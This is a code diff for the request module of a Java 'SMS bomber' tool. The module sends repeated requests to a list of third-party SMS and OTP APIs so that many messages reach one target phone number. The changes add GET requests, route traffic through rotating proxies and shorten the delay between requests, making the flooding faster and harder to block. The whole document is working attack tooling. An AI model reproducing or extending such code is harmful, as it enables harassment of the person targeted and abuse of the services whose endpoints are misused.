@@ -5,6 +5,8 @@ import com.google.gson.JsonObject;
 import com.google.gson.JsonPrimitive;
 import ir.mrsf.smsbomber.SMSBomber;
 import ir.mrsf.smsbomber.enums.ContentType;
+import ir.mrsf.smsbomber.enums.Method;
+import ir.mrsf.smsbomber.managers.ProxyManager;
 import ir.mrsf.smsbomber.models.API;
 import lombok.experimental.UtilityClass;
 
@@ -20,9 +22,11 @@ import java.util.function.Consumer;
 @UtilityClass
 public class RequestUtil {
     private static final Gson gson;
+    private static ProxyManager proxyManager;
 
     static {
         gson = new Gson();
+        proxyManager = null;
     }
 
     public void sendSMSRequest(ExecutorService executor, String phone) {
@@ -30,7 +34,7 @@ public class RequestUtil {
 
             final List<API> apiList = SMSBomber.getSmsBomber().getConfigManager().getApiList();
             for (API api : apiList) {
-                final Object payload = api.getPayload();
+                final Object payload = api.payload();
                 ContentType contentType;
                 String body;
                 if (payload instanceof JsonObject payloadJson) {
@@ -43,21 +47,27 @@ public class RequestUtil {
                     contentType = null;
                     body = null;
                 }
-                if (contentType == null) continue;
-                if (body == null) continue;
-                final String phoneNumber;
-                if (api.isWithOutZero()) {
-                    phoneNumber = api.getCountryCode() + phone.replaceFirst("^0+", "");
-                } else {
-                    phoneNumber = api.getCountryCode() + phone;
+                if (api.method() == Method.POST) {
+                    if (contentType == null) continue;
+                    if (body == null) continue;
                 }
-                for (int i = 0; i < api.getRepeat(); i++) {
-                    executor.submit(() -> {
-                        smsRequest(api.getUrl().replaceAll("%phone%", phoneNumber), contentType,
-                                body.replaceAll("%phone%", phoneNumber),
-                                (integer) -> sendLog(api.getName(), integer)
-                        );
-                    });
+                final String phoneNumber;
+                if (api.withOutZero()) {
+                    phoneNumber = phone.replaceFirst("^0+", "");
+                } else {
+                    phoneNumber = phone;
+                }
+                for (int i = 0; i < api.repeat(); i++) {
+                    switch (api.method()) {
+                        case POST -> executor.submit(() -> smsRequest(StringUtil.setPlaceHolder(phoneNumber, api.url())
+                                , contentType, StringUtil.setPlaceHolder(phoneNumber, body),
+                                (integer) -> sendLog(api.name(), integer)
+                        ));
+                        case GET -> executor.submit(() -> smsRequest(StringUtil.setPlaceHolder(phoneNumber, api.url()),
+                                (integer) -> sendLog(api.name(), integer)
+                        ));
+                        default -> throw new RuntimeException("Invalid method");
+                    }
                 }
                 Thread.sleep(100);
             }
@@ -67,40 +77,52 @@ public class RequestUtil {
     }
 
     private void sendLog(String name, int responseCode) {
-        if (responseCode == HttpURLConnection.HTTP_OK) {
-            System.out.println("Sent from: " + name);
-        } else {
-            System.out.println("Failed to send: " + name);
-        }
+        System.out.println("Sent from: " + name + " status: " + responseCode);
     }
 
     private void smsRequest(String url, ContentType contentType, String body, Consumer<Integer> callback) {
         try {
-            Thread.sleep(3000);
-            byte[] postData = body.getBytes(StandardCharsets.UTF_8);
-            final HttpURLConnection conn = getHttpURLConnectionSMS(url, contentType, postData);
+            Thread.sleep(500);
+            final byte[] postData = body.getBytes(StandardCharsets.UTF_8);
+            final HttpURLConnection connection = getHttpURLConnectionSMS(url, contentType, postData);
 
-            try (OutputStream os = conn.getOutputStream()) {
-                os.write(postData);
+            try (OutputStream outputStream = connection.getOutputStream()) {
+                outputStream.write(postData);
             }
 
-            callback.accept(conn.getResponseCode());
-        } catch (Exception e) {
+            callback.accept(connection.getResponseCode());
+        } catch (Exception ignored) {
+            callback.accept(500);
+        }
+    }
+
+    private void smsRequest(String url, Consumer<Integer> callback) {
+        try {
+            Thread.sleep(500);
+            proxyManager = SMSBomber.getSmsBomber().getProxyManager();
+            final HttpURLConnection connection = (HttpURLConnection) new URL(url).
+                    openConnection(proxyManager.getNextProxy());
+            connection.setRequestMethod("GET");
+            connection.setConnectTimeout(3000);
+            connection.setReadTimeout(3000);
+            callback.accept(connection.getResponseCode());
+        } catch (Exception ignored) {
             callback.accept(500);
         }
     }
 
 
     private HttpURLConnection getHttpURLConnectionSMS(String url, ContentType contentType, byte[] postData) throws IOException {
-        final HttpURLConnection conn = (HttpURLConnection) new URL(url).
-                openConnection(SMSBomber.getSmsBomber().getProxyManager().getNextProxy());
-        conn.setDoOutput(true);
-        conn.setInstanceFollowRedirects(false);
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", contentType.getString());
-        conn.setRequestProperty("charset", "utf-8");
-        conn.setRequestProperty("Content-Length", Integer.toString(postData.length));
-        conn.setUseCaches(false);
-        return conn;
+        proxyManager = SMSBomber.getSmsBomber().getProxyManager();
+        final HttpURLConnection connection = (HttpURLConnection) new URL(url).
+                openConnection(proxyManager.getNextProxy());
+        connection.setDoOutput(true);
+        connection.setInstanceFollowRedirects(false);
+        connection.setRequestMethod("POST");
+        connection.setRequestProperty("Content-Type", contentType.getString());
+        connection.setRequestProperty("charset", "utf-8");
+        connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
+        connection.setUseCaches(false);
+        return connection;
     }
 }
